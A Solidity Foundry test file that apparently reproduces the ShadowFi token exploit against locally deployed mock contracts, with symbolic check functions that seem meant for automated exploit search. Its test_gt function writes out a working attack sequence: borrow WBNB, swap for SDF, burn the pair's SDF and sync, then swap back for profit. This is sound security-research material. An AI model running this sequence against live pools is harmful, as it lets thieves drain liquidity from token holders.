// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./ShadowFi.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract ShadowFiTest is Test, BlockLoader {
    ShadowFi sdf;
    WBNB wbnb;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address sdfAddr;
    address wbnbAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1662087759;
    uint112 reserve0pair = 10354946297404462;
    uint112 reserve1pair = 1078615699417903036883;
    uint32 blockTimestampLastpair = 1662087399;
    uint256 kLastpair = 11168582114763855959993144120569517654;
    uint256 price0CumulativeLastpair =
        157449582249269446379575224577723805796713567;
    uint256 price1CumulativeLastpair = 11000324645391158414408753680638581;
    uint256 totalSupplysdf = 99217139151583758;
    uint256 balanceOfsdfpair = 10354946297404462;
    uint256 balanceOfsdfattacker = 0;
    uint256 balanceOfsdf = 0;
    uint256 totalSupplywbnb = 4333032609170794678942729;
    uint256 balanceOfwbnbpair = 1078615699417903036883;
    uint256 balanceOfwbnbattacker = 2000000000000000000;
    uint256 balanceOfwbnb = 29524049518234847547;

    function setUp() public {
        owner = address(this);
        sdf = new ShadowFi(1662075000);
        sdfAddr = address(sdf);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        pair = new UniswapV2Pair(
            address(sdf),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        sdf.transfer(address(pair), balanceOfsdfpair);
        wbnb.transfer(address(attacker), balanceOfwbnbattacker);
        sdf.afterDeploy(address(router), address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(sdf), address(wbnb), sdf.decimals());
        emit log_string("");
        emit log_string("Sdf Balances: ");
        queryERC20BalanceDecimals(address(wbnb), address(sdf), wbnb.decimals());
        queryERC20BalanceDecimals(address(sdf), address(sdf), sdf.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(sdf), address(pair), sdf.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(sdf),
            address(attacker),
            sdf.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_sdf_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        sdf.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_sdf_owner(uint256 amount) internal eurus {
        sdf.transfer(owner, amount);
    }

    function borrow_wbnb_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_pair(uint256 amount) internal eurus {
        wbnb.transfer(address(pair), amount);
    }

    function borrow_sdf_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        sdf.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_sdf_pair(uint256 amount) internal eurus {
        sdf.transfer(address(pair), amount);
    }

    function swap_pair_attacker_sdf_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        sdf.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_wbnb_sdf(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_sdf_pair(uint256 amount) internal eurus {
        sdf.burn(address(pair), amount);
        pair.sync();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.assume(amt5 >= (amt0 * 1003) / 1000);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sdf(amt1, amt2);
        swap_pair_attacker_sdf_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.assume(amt6 >= (amt0 * 1003) / 1000);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sdf(amt1, amt2);
        burn_sdf_pair(amt3);
        swap_pair_attacker_sdf_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        borrow_wbnb_owner(1e16);
        printBalance("After step0 ");
        swap_pair_attacker_wbnb_sdf(
            1e16,
            pair.getAmountOut(1e16, address(wbnb))
        );
        printBalance("After step1 ");
        burn_sdf_pair(sdf.balanceOf(address(pair)) - 1);
        printBalance("After step2 ");
        swap_pair_attacker_sdf_wbnb(
            sdf.balanceOf(attacker),
            pair.getAmountOut(sdf.balanceOf(attacker), address(sdf))
        );
        printBalance("After step3 ");
        payback_wbnb_owner((1e16 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.assume(amt6 >= (amt0 * 1003) / 1000);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sdf(amt1, amt2);
        burn_sdf_pair(amt3);
        swap_pair_attacker_sdf_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
